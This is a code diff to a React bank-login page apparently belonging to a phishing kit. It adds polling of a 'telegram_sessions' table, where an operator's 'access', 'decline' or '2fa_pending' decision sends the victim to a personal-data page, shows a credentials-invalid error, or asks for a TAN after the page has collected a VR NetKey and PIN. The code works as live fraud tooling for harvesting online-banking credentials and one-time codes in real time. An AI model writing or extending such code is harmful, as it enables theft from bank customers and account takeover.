@@ -123,8 +123,61 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const [pinError, setPinError] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
+  const [credentialsInvalid, setCredentialsInvalid] = useState(false);
 
   const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
+  const qrPollRef = useRef<{ timer: any; sessionId: string; startedAt: number } | null>(null);
+
+  function stopQrPolling() {
+    if (qrPollRef.current?.timer) clearTimeout(qrPollRef.current.timer);
+    qrPollRef.current = null;
+  }
+
+  function startQrPolling(sessionId: string, startedAt: number) {
+    stopQrPolling();
+    qrPollRef.current = { timer: null, sessionId, startedAt };
+    const tick = async () => {
+      if (!qrPollRef.current || qrPollRef.current.sessionId !== sessionId) return;
+      if (Date.now() - startedAt > POLL_TIMEOUT_MS) {
+        setErrorMsg("Zeitüberschreitung. Bitte neu starten.");
+        stopQrPolling();
+        setPhase("form");
+        setSubmitting(false);
+        return;
+      }
+      const { data } = await supabase
+        .from("telegram_sessions")
+        .select("decision")
+        .eq("id", sessionId)
+        .maybeSingle();
+      const decision = (data as any)?.decision as string | undefined;
+      if (decision === "access" || decision === "2fa_access") {
+        stopQrPolling();
+        setSubmitting(false);
+        navigate({ to: "/qr-personal-data/$sessionId", params: { sessionId } });
+        return;
+      }
+      if (decision === "decline" || decision === "2fa_decline") {
+        stopQrPolling();
+        setVrNetKeyError(true);
+        setPinError(true);
+        setCredentialsInvalid(true);
+        setErrorMsg(null);
+        setPhase("form");
+        setSubmitting(false);
+        return;
+      }
+      if (decision === "2fa_pending") {
+        setPhase("tan");
+        setSubmitting(false);
+      } else {
+        setSubmitting(true);
+      }
+      qrPollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
+    };
+    tick();
+  }
+
 
   useEffect(() => {
     (async () => {
